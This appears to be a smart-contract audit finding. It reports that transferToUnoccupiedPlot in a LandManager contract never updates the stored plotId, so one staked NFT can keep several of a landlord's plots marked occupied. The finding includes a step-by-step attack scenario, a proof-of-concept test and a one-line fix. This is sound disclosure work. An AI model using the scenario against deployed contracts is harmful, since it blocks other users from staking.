# Vulnerability details

## Impact
User can occupy all unoccupied lender's plots by only staking one NFT, Which will result in restricting other users from staking to the plots.

`transferToUnoccupiedPlot` external function failed to update `toilerState[tokenId].plotId` with the new plotId which allows a user to occupy all unoccupied plotIds of `toilerState[tokenId].landlord` by calling the function multiple times with different unoccupied plotId of `toilerState[tokenId].landlord` potentially restricting other users from staking to the plotIds.

## Proof of Concept
The following scenario shows how Bob can occupied some plotIds.
1. Bob staked his munchableNFT( tokenId = 1) to plotId 120 of Alice(lender).
2. Bob call `transferToUnoccupiedPlot` function with tokenId of 1 and plotId of 20 as function parameters. Now plotId 120 should be marked unoccupied.
3. Bob call `transferToUnoccupiedPlot` function with tokenId of 1 and plotId of 21 as function parameters again. Now plotId 20 should be marked unoccupied.
4. Bob again call `transferToUnoccupiedPlot` function with tokenId of 1 and plotId of 22 as function parameters. Now plotId 21 should be marked unoccupied.

Unfortunately only plotId 120 will be marked unoccupied, plotId 20 and 21 will still be occupied because the `transferToUnoccupiedPlot` function is reading plotId 120 as oldPlotId for all the calls to the function.

Add below test path in `/tests/managers/LandManager/transferToUnoccupiedPlot.test.ts`.

```javascript
it("Issues with transferToUnoccupiedPlot function", async () => {
      // Bob transferred to plotId 20 leaves plotId 120
      const { request1 } = await testContracts.landManagerProxy.contract.simulate.transferToUnoccupiedPlot([1, 20], { account: bob, });
      const txHash1 = await testClient.writeContract(request1);
      await assertTxSuccess({ txHash: txHash1 });

      // Bob transferred to plotId 21 leaves plotId 20
      const { request2 } = await testContracts.landManagerProxy.contract.simulate.transferToUnoccupiedPlot([1, 21], { account: bob, });
      const txHash2 = await testClient.writeContract(request2);
      await assertTxSuccess({ txHash: txHash2 });

      // Bob transferred to plotId 22 leaves plotId 21
      const { request3 } = await testContracts.landManagerProxy.contract.simulate.transferToUnoccupiedPlot([1, 22], { account: bob, });
      const txHash3 = await testClient.writeContract(request3);
      await assertTxSuccess({ txHash: txHash3 });

      // Bob approved landmanager contract
      const txHashApprove = await testContracts.munchNFT.contract.write.approve([testContracts.landManagerProxy.contract.address, 2], { account: bob });
      await assertTxSuccess({ txHash: txHashApprove });
      
      // Bob tries to stake to plotId 20 since it should be free
      await assert.rejects(testContracts.landManagerProxy.contract.simulate.stakeMunchable([alice, 2, 20], { account: bob, }), (err: Error) => assertContractFunctionRevertedError(err, "OccupiedPlotError"));

      // Bob tries to stake to plotId 21 since it should be free
      await assert.rejects(testContracts.landManagerProxy.contract.simulate.stakeMunchable([alice, 2, 21], { account: bob, }), (err: Error) => assertContractFunctionRevertedError(err, "OccupiedPlotError"));
    
});
```

## Recommended Mitigation Steps
Add below line of code after `toilerState[tokenId].latestTaxRate = plotMetadata[_toiler.landlord].currentTaxRate;` in `transferToUnoccupiedPlot` external function.
```javascript
toilerState[tokenId].plotId = plotId
```
